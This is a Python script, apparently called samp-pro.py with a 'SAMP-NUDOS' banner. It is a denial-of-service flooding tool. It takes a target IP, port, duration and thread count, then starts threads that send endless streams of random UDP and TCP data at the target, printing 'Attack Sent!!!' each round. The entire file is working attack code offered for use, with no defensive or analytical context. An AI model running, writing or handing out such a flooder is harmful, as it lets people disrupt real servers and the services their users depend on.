import random 
import socket 
import threading 
import os 
import sys 
import time 
  
if len(sys.argv)==1:
    sys.exit('Usage: python3 samp-pro.py <ip> <port> <time> <thread>')
ip = str(sys.argv[1]) 
port = int(sys.argv[2]) 
times = int(sys.argv[3]) 
threads = int(sys.argv[4]) 
choice = "y"
os.system("clear") 
print(""" 
 \u001b[35m 
         ╔═╗╔═╗╔╦╗╔═╗   ╔╗╔╦ ╦╔╦╗╔═╗╔═╗ 
         ╚═╗╠═╣║║║╠═╝───║║║║ ║ ║║║ ║╚═╗ 
         ╚═╝╩ ╩╩ ╩╩     ╝╚╝╚═╝═╩╝╚═╝╚═╝ V 1.5 
 """) 
 
def run(): 
         data = random._urandom(1024) 
         i = random.choice(("[*]","[!]","[#]")) 
         while True: 
                 try: 
                         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
                         addr = (str(ip),int(port)) 
                         for x in range(times): 
                                 s.sendto(data,addr) 
                         print(i +"Attack Sent!!!") 
                 except: 
                         print("[!] Error!!!") 
  
def run2(): 
         data = random._urandom(999) 
         i = random.choice(("[*]","[!]","[#]")) 
         while True: 
                 try: 
                         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
                         s.connect((ip,port)) 
                         s.send(data) 
                         for x in range(times): 
                                 s.send(data) 
                         print(i +"Attack Sent!!!") 
                 except: 
                         s.close() 
                         print("[*] Error!!!") 
  
  
def run3(): 
         data = random._urandom(818) 
         i = random.choice(("[*]","[!]","[#]")) 
         while True: 
                 try: 
                         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
                         s.connect((ip,port)) 
                         s.send(data) 
                         for x in range(times): 
                                 s.send(data) 
                         print(i +"Attack Sent!!!") 
                 except: 
                         s.close() 
                         print("[*] Error!!!") 
  
  
def run4(): 
         data = random._urandom(16) 
         i = random.choice(("[*]","[!]","[#]")) 
         while True: 
                 try: 
                         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
                         s.connect((ip,port)) 
                         s.send(data) 
                         for x in range(times): 
                                 s.send(data) 
                         print(i +"Attack Sent!!!") 
                 except: 
                         s.close() 
                         print("[*] Error!!!") 
  
  
for y in range(threads): 
         if choice == 'y': 
                 th = threading.Thread(target = run) 
                 th.start() 
                 th = threading.Thread(target = run2) 
                 th.start() 
                 th = threading.Thread(target = run3) 
                 th.start() 
else: 
                 th = threading.Thread(target = run4) 
                 th.start()